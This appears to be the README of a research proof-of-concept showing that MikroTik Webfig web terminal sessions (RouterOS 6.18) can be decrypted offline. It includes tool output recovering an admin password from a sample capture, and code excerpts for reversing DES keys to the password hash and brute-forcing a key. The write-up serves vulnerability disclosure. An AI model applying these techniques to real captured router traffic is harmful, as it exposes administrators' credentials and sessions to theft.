# PoC: Offline Decryption of Mikrotik's Web Terminal
## Technical Summary
The encryption scheme used by Mikrotik's Webfig terminal software as seen on the RB750GL running RouterOS version 6.18 is susceptible to offline brute force attacks that allow a third party to recover login credentials (username and password) as well as full decryption of the terminal session. The implementation appears to emulate RFC 3079's MPPE session key generation, but the protocol implementation is weakened by additional data that allows us to derive the MD4 hash of the user's password and thus recover the session keys.

## Proof of Concept Summary
### Sample
Sample files that can be used with the proof of concept software are located in the *sample* directory:
1. **login.pcap**: A pcap file containing a single web terminal session.
2. **passwords.txt**: A short list of passwords to use with the MD4 bruteforce software.

### Software
Three proof of concepts are included in this repository:
1. **jsproxy_md4_bruteforce**: Using a provided pcap and password list this tool will generate the masterkey used for the terminal send and receive functions.
```sh
charlie@wildcard:~/jsproxy_crypto/md4_bruteforce/build$ ./jsproxy_md4_bruteforce -f ../../sample/login.pcap -p ../../sample/passwords.txt 
[+] Loading passwords...
[+] Passwords loaded: 16
[+] Initial request found.
[+] Server challenge received.
[+] Challenge response found.
Username: admin
Password: test
SHA-1(Password SHA-1): 2066656e05c22f3a995ad9ecfed913d6
Master Key: d1dd2f0fe4f5c1c4386595c4b56e64c9
```
2. **jsproxy_des_bruteforce**: Using a provided pcap this tool will generate the master key used for the terminal send and receive functions. Note that this tool is keyed to break the the provided session in exampes/login.pcapng and is a proof of concept in the truest sense. For full technical details see the technical details section.
```sh
charlie@wildcard:~/jsproxy_crypto/des_bruteforce/build$ ./jsproxy_des_bruteforce -f ../../sample/login.pcap 
[+] Initial request found.
[+] Server challenge received.
[+] Challenge response found.
Username: admin
[+] Brute forcing DES Key 3
DES Key 3: 949ac00000000000
[+] "Brute forcing" DES Key 2
DES Key 2: be94a05006cace70
[+] "Brute forcing" DES Key 1
DES Key 1: 0c5aa490802ede2e
Password SHA-1: 0cb6948805f797bf2a82807973b89537
SHA-1(Password SHA-1): 2066656e05c22f3a995ad9ecfed913d6
Master Key: d1dd2f0fe4f5c1c4386595c4b56e64c9
```
3. **jsproxy_session_decrypt**: Using a provided pcap and a masterkey this tool will decrypt the terminal session in the pcap and write the plaintext to standard out.
```sh
charlie@wildcard:~/jsproxy_crypto/session_decrypt/bu$ ./jsproxy_session_decrypt -f ../../sample/login.pcap -m d1dd2f0fe4f5c1c4386595c4b56e64c9
[+] Initial request found.
[+] Server challenge received.
[+] Challenge response found.
Server decrypted: 
{Uff0001:[4],uff000b:65534,sfe0009:'default',sff000a:'admin'}        
Client decrypted: 
{}        
Client decrypted: 
{Uff0001:[76],uff0007:655461,s1:'test',s7:'vt102',u5:80,u6:24}   
...
```
### Build Instructions
All the tools are written in C++ and rely on Boost and Libpcap. To compile use cmake. If you aren't familiar with how that works:
```sh
charlie@wildcard:~/jsproxy_crypto/des_bruteforce$ cd build/
charlie@wildcard:~/jsproxy_crypto/des_bruteforce/build$ make clean
charlie@wildcard:~/jsproxy_crypto/des_bruteforce/build$ cmake ..
-- Boost version: 1.54.0
-- Found the following Boost libraries:
--   program_options
--   system
-- Configuring done
-- Generating done
-- Build files have been written to: /home/charlie/jsproxy_crypto/des_bruteforce/build
charlie@wildcard:~/jsproxy_crypto/des_bruteforce/build$ make
Scanning dependencies of target jsproxy_des_bruteforce
[ 20%] Building CXX object CMakeFiles/jsproxy_des_bruteforce.dir/src/main.cpp.o
[ 40%] Building CXX object CMakeFiles/jsproxy_des_bruteforce.dir/src/session_parser.cpp.o
[ 60%] Building CXX object CMakeFiles/jsproxy_des_bruteforce.dir/home/charlie/jsproxy_crypto/common/des.cpp.o
[ 80%] Building CXX object CMakeFiles/jsproxy_des_bruteforce.dir/home/charlie/jsproxy_crypto/common/sha1.cpp.o
[100%] Building CXX object CMakeFiles/jsproxy_des_bruteforce.dir/home/charlie/jsproxy_crypto/common/md4.cpp.o
Linking CXX executable jsproxy_des_bruteforce
[100%] Built target jsproxy_des_bruteforce
```
## Technical Details
### Initial Handshake
#### Request
The connection is started by the client (web terminal) by sending an HTTP POST to /jsproxy on the client's port 80 HTTP server. The POST message does not contain any data after the HTTP header. Note that the pcap in ./sample/ has a cookie set with "username=admin".

#### Challenge
The server responds to the the client with a challenge. Examining the payload after the HTTP header is not helpful since the data is UTF-16 encoded. However, we can easily translate to ASCII using something similar to Javascript's codePointAt() function. To clarify, here is the implementation of codePointAt() used in the proof of concept code (note that this is not held out as exemplary code but to illustrate the conversion needed to start parsing the messages):
```
    /*
     * A c++ version of javascript's codePointAt. Only supports the two byte
     * version. Also, incremented index so that the caller can track how many
     * bytes were consumed (0, 1, or 2).
     */
    boost::uint8_t codePointAt(const std::string& p_seq, std::size_t& index)
    {
        char c1 = p_seq[index];
        if (c1 & 0x80) {
            if ((c1 & 0xf0) != 0xc0) {
                throw std::runtime_error("Unhandled unicode size");
            }
            if ((index + 1) >= p_seq.length()) {
                throw std::runtime_error("Not enough data in the string");
            }
            index++;
            if ((c1 & 0x0f) <= 2) {
                return p_seq[index++];
            }
            return p_seq[index++] | (1 << ((c1 & 0x0f) - 1 + 4));
        }
        index++;
        return c1;
    }
```
Because the encoding generates variable size data (one byte can be encoded to two) I will be referring to any offsets in this document as "code point offsets". Meaning you would need to convert 'x' amount of UTF-16 characters using codePointAt to arrive at the given offset.

At code point offset 8 after the HTTP response the server has included 16 bytes of random data for the client to use in a challenge response. If you are following along with the sample pcap these bytes are (they are grouped in their encoded form):
```
\xc2\x93 \xc3\xb4 \x1d \x55 \xc2\xb3 \xc3\xbb \x45 \xc3\x8f
\xc2\x80 \xc2\x99 \xc2\xae \x78 \x5d \xc2\xaf \x50 \xc2\xa6
```

#### Challenge Response
The client responds to the server's challenge by HTTP POSTing to /jsproxy again. A number of things can be found in the challenge response:
1. A hardcoded 16 byte challenge string.
2. The hardcoded challenge concatenated with the server's random challenge and the username that is then pushed through SHA1 and truncated to 8 bytes to create the "challenge hash".
3. The challenge hash DES encrypted with three different keys and concatenated together to generate the "response" string.
4. The username in ASCII.

The above contains almost everything you need to generate the "master key" that will be used to initialize the RC4 state. The only secret that is not available to us is the user's password. The user's password is used in two ways:
1. The user's password is MD4 hashed and then "hashed" again to generate the three keys used in the DES encryption.
2. The MD4 hash of the password is MD4 hashed again, combined with "response" and a "magic" string, run through SHA1, and truncated to 16 bytes to generate the "master key" that will be used to initialize the RC4 send and receive states.

##### Brute Forcing the DES Keys to Obtain the MD4 Hash of the User's Password
The "hash" used to generate the keys for the DES encryption is reversible. The "hash" takes the 16 bytes of the MD4(password) and creates 24 bytes of data that is chopped up into three DES keys. There is some bit shifting so that there is not a direct mapping of the MD4(password) to the key, but it is easily undone. In fact, here is the code the PoC uses to convert a DES key to 7 bytes of the MD4(password) hash:
```
    std::string makePwdHash(const std::string& p_key)
    {
        std::string pwdHash;
        pwdHash.resize(7, 0);

        pwdHash[0] = p_key[0] | ((p_key[1] & 0x80) >> 7);
        pwdHash[1] = ((p_key[1] & 0x7e) << 1) | ((p_key[2] & 0xc0) >> 6);
        pwdHash[2] = ((p_key[2] & 0x3e) << 2) | ((p_key[3] & 0xe0) >> 5);
        pwdHash[3] = ((p_key[3] & 0x1e) << 3) | ((p_key[4] & 0xf0) >> 4);
        pwdHash[4] = ((p_key[4] & 0x0e) << 4) | ((p_key[5] & 0xf8) >> 3);
        pwdHash[5] = ((p_key[5] & 0x06) << 5) | ((p_key[6] & 0xfc) >> 2);
        pwdHash[6] = ((p_key[6] & 0x02) << 6) | ((p_key[7] & 0xfe) >> 1);

        return pwdHash;
    }
```
If you are reading closely you might be wondering how three keys with 7 bytes of recoverable data combine to make a 16 byte MD4 hash. The answer is simple: the third key has only two bytes of recoverable in the upper 3 bytes of the key. The rest of the third key is simply padded with zeros which makes it very easy to brute force. From the PoC code:
```
    /*
     * We only have to guess 21 bits for the third key!
     */
    bool getKey3(std::string& p_key3, const std::string& p_response3, const std::string& p_challengeHash)
    {
        std::cout << "[+] Brute forcing DES Key 3" << std::endl;

        p_key3.clear();
        p_key3.resize(8, 0);

        for (std::size_t i = 0; i < 256; i += 2) {
            p_key3[0] = i;
            for(std::size_t j = 0; j < 256; j += 2) {
                p_key3[1] = j;
                for(std::size_t k = 0; k < 256; k += 2) {
                    p_key3[2] = k;
                    std::string encrypted;
                    DES::des(p_challengeHash, p_key3, encrypted);
                    if (encrypted == p_response3) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
```
And just like that we have the lower two bytes of the MD4 hash of the user's password. To reiterate, if we can brute force the first and second DES keys we have the entire hash of the password which we can use to create the "master key" and decrypt the entire terminal session.

However, on my home hardware, brute forcing 56-bit keys in a reasonable amount of time is not practical. As such the PoC "jsproxy_des_bruteforce" cheats and I've given it 49 bits of the sample pcaps keys. I think it proves the point though that an individual with sufficient computing power can break the terminal decryption.

##### Brute Forcing the MD4(password) to Generate the Master Key
As mentioned above, brute forcing two 56-bit DES keys is not practical for most people. However, we don't need to actually break the DES keys to start decrypting the terminal data. We just need to guess what the MD4(password) is. This is easy to solve if we trust the user to make a guessable password and we have a password list handy. For each password we guess we just have to:
1. MD4 hash the password we are guessing
2. Generate the DES encrypted "responses" without our MD4(password)
3. Compare what we generated against the "response" in the pcap.
4. If they match then we have the user's password and we can decrypt the terminal sessions. Else go to 1.

# Summary
I've explained two ways we can recover the MD4(password) so that we can decrypt the web terminal traffic. I've provided code and a pcap so that you can try it yourself. I must stress that the code is very proof of concept but it works for the provided sample.
